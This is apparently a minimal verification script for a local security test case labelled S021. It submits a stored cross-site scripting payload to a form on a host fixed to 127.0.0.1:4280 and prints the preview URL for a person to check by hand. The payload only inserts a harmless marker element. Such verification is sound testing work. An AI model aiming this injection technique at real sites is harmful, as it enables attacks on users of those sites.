#!/usr/bin/env python3
import argparse
import http.client
import sys
from urllib.parse import parse_qs, urlencode, urljoin, urlsplit

FIXED_HOST = "127.0.0.1"
FIXED_PORT = 4280
PAYLOAD = '''<script>document.body.insertAdjacentHTML('beforeend','<p id="s021-marker">S021-XSS-MARKER</p>')</script>'''


def validate_target(url: str):
    parsed = urlsplit(url)
    if parsed.scheme != "http" or parsed.hostname != FIXED_HOST or parsed.port != FIXED_PORT:
        raise ValueError("目标主机必须固定为 http://127.0.0.1:4280")
    if parsed.username or parsed.password:
        raise ValueError("不允许 URL 中包含用户信息")
    return parsed


def post_form(url: str, data: dict):
    parsed = validate_target(url)
    path = parsed.path or "/"
    if parsed.query:
        path += "?" + parsed.query
    body = urlencode(data).encode("utf-8")
    conn = http.client.HTTPConnection(parsed.hostname, parsed.port, timeout=10)
    conn.request("POST", path, body=body, headers={"Content-Type": "application/x-www-form-urlencoded", "Content-Length": str(len(body))})
    response = conn.getresponse()
    status = response.status
    headers = {k.lower(): v for k, v in response.getheaders()}
    response_body = response.read().decode("utf-8", "replace")
    conn.close()
    return status, headers, response_body


def main():
    parser = argparse.ArgumentParser(description="S021 存储型 XSS 最小本地验证提交脚本")
    parser.add_argument("--submit-url", required=True)
    parser.add_argument("--case", choices=["normal", "test"], required=True)
    args = parser.parse_args()
    validate_target(args.submit_url)
    if args.case == "normal":
        title, body = "普通标题-S021", "普通正文：无脚本标记"
    else:
        title, body = "测试标题-S021", PAYLOAD
    status, headers, response_body = post_form(args.submit_url, {"title": title, "body": body})
    print("status=", status)
    if status not in (302, 303):
        print(response_body[:2000])
        sys.exit(1)
    location = headers.get("location")
    if not location:
        print("缺少 Location 响应头，无法得到预览 URL")
        sys.exit(1)
    preview_url = urljoin(args.submit_url, location)
    validate_target(preview_url)
    draft_id = parse_qs(urlsplit(preview_url).query).get("id", [""])[0]
    print("preview_url=", preview_url)
    print("draft_id=", draft_id)
    print("说明：脚本未自动跟随重定向、未自动断言 JavaScript 执行。")
    print("请在浏览器人工打开 preview_url，观察页面是否出现 S021-XSS-MARKER。")


if __name__ == "__main__":
    main()
